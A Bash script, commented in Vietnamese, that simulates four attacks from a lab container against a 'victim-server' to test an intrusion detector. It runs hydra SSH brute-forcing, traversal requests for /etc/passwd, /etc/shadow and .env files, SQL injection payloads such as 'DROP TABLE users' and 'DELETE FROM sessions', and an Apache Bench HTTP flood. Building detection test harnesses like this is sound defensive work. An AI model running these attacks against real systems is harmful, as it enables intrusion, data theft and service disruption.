#!/bin/bash
# ============================================================================
# attack_scripts.sh — Script mô phỏng 4 kịch bản tấn công
# ============================================================================
# Chạy từ bên trong container attacker-machine.
#
# Cách dùng:
#   ./attack_scripts.sh bruteforce    → SSH Brute-Force (hydra)
#   ./attack_scripts.sh traversal     → Directory Traversal (curl, 1 random)
#   ./attack_scripts.sh sqli          → SQL Injection (curl, 1 random)
#   ./attack_scripts.sh flood         → HTTP DoS/Flood (ab 200 req)
#   ./attack_scripts.sh all           → Chạy tất cả tuần tự
#
# Lưu ý: Sau mỗi attack, victim sẽ block IP attacker.
#   Dùng run_test.sh trên HOST để tự động restart victim giữa các lần.
# ============================================================================

VICTIM="victim-server"

# Hàm tiện ích: chọn ngẫu nhiên 1 phần tử từ mảng
random_pick() {
    local arr=("$@")
    local idx=$(( RANDOM % ${#arr[@]} ))
    echo "${arr[$idx]}"
}

# ======================== ATTACK 1: SSH Brute-Force =========================
attack_bruteforce() {
    echo "============================================"
    echo "  🔐 ATTACK: SSH Brute-Force"
    echo "  Target: $VICTIM:22"
    echo "  Tool:   hydra"
    echo "============================================"
    echo ""

    # hydra thử tổ hợp username:password từ wordlist
    # -t 4 : 4 thread đồng thời (vừa đủ để log kịp ghi)
    # -V   : verbose — hiện từng lần thử
    # -f   : dừng ngay khi tìm được password đúng
    hydra -L /opt/attack/usernames.txt \
          -P /opt/attack/passwords.txt \
          -t 4 -V -f \
          ssh://$VICTIM

    echo ""
    echo "  ✅ Brute-force attack completed."
    echo ""
}

# ======================== ATTACK 2: Directory Traversal =====================
attack_traversal() {
    echo "============================================"
    echo "  📂 ATTACK: Directory/File Traversal"
    echo "  Target: $VICTIM:80"
    echo "  Tool:   curl (1 random payload)"
    echo "============================================"
    echo ""

    # Danh sách path nhạy cảm (tất cả đều match TRAVERSAL_PATTERNS trong detector)
    PATHS=(
        "/.env"
        "/.git/config"
        "/.htaccess"
        "/.htpasswd"
        "/wp-config.php"
        "/admin/"
        "/phpmyadmin/"
        "/server-status"
        "/../../etc/passwd"
        "/../../etc/shadow"
        "/proc/self/environ"
        "/.git/HEAD"
        "/admin/.env"
    )

    # Chọn ngẫu nhiên 1 payload để gửi
    local path=$(random_pick "${PATHS[@]}")
    echo "  Payload: $path"
    echo "  → GET http://$VICTIM$path"
    curl -s -o /dev/null -w "    HTTP Status: %{http_code}\n" \
         --max-time 5 "http://$VICTIM$path"

    echo ""
    echo "  ✅ Traversal attack completed."
    echo ""
}

# ======================== ATTACK 3: SQL Injection ===========================
attack_sqli() {
    echo "============================================"
    echo "  💉 ATTACK: SQL Injection"
    echo "  Target: $VICTIM:80"
    echo "  Tool:   curl (1 random payload)"
    echo "============================================"
    echo ""

    # Các payload SQLi phổ biến (URL-encoded)
    PAYLOADS=(
        "/search?q=1%20OR%201=1"
        "/api/users?id=1%20UNION%20SELECT%20*%20FROM%20users"
        "/login?user=admin'%20OR%20'1'='1"
        "/products?category=1;%20DROP%20TABLE%20users"
        "/api?id=1%20AND%201=1"
        "/search?q=1'%20UNION%20SELECT%20username,password%20FROM%20users--"
        "/api?id=SLEEP(5)"
        "/api?id=1%20BENCHMARK(1000000,SHA1('test'))"
        "/search?q=%27%20OR%20%271%27=%271"
        "/api/data?filter=1;DELETE%20FROM%20sessions"
    )

    # Chọn ngẫu nhiên 1 payload
    local payload=$(random_pick "${PAYLOADS[@]}")
    echo "  Payload: $payload"
    echo "  → GET http://$VICTIM$payload"
    curl -s -o /dev/null -w "    HTTP Status: %{http_code}\n" \
         --max-time 5 "http://$VICTIM$payload"

    echo ""
    echo "  ✅ SQL Injection attack completed."
    echo ""
}

# ======================== ATTACK 4: HTTP DoS/Flood ==========================
attack_flood() {
    echo "============================================"
    echo "  🌊 ATTACK: HTTP DoS/Flood"
    echo "  Target: $VICTIM:80"
    echo "  Tool:   ab (Apache Bench)"
    echo "============================================"
    echo ""

    # ab: 200 request, 50 đồng thời → vượt ngưỡng 100 req/10s
    echo "  Sending 200 requests with 50 concurrent connections..."
    ab -n 200 -c 50 "http://$VICTIM/" 2>&1 | grep -E "Requests per|Complete|Failed|Time taken"

    echo ""
    echo "  ✅ HTTP Flood attack completed."
    echo ""
}

# ======================== MENU =============================================
case "${1:-help}" in
    bruteforce|bf)
        attack_bruteforce
        ;;
    traversal|tr)
        attack_traversal
        ;;
    sqli|sql)
        attack_sqli
        ;;
    flood|dos)
        attack_flood
        ;;
    all)
        echo "============================================"
        echo "  ⚔️  RUNNING ALL 4 ATTACKS SEQUENTIALLY"
        echo "  Target: $VICTIM"
        echo "============================================"
        echo ""
        echo "  ⚠️  Lưu ý: Sau attack đầu tiên, IP sẽ bị block."
        echo "  Dùng run_test.sh trên HOST để auto-restart giữa các lần."
        echo ""
        attack_traversal
        sleep 2
        attack_sqli
        sleep 2
        attack_flood
        sleep 2
        attack_bruteforce
        echo ""
        echo "============================================"
        echo "  ⚔️  ALL ATTACKS COMPLETED"
        echo "============================================"
        ;;
    *)
        echo "============================================"
        echo "  ⚔️  Attack Scripts — Hướng dẫn"
        echo "============================================"
        echo ""
        echo "  Cách dùng: ./attack_scripts.sh <command>"
        echo ""
        echo "  Commands:"
        echo "    bruteforce (bf)   SSH Brute-Force (hydra)"
        echo "    traversal  (tr)   Directory Traversal (curl)"
        echo "    sqli       (sql)  SQL Injection (curl)"
        echo "    flood      (dos)  HTTP DoS/Flood (ab)"
        echo "    all               Chạy tất cả tuần tự"
        echo ""
        ;;
esac
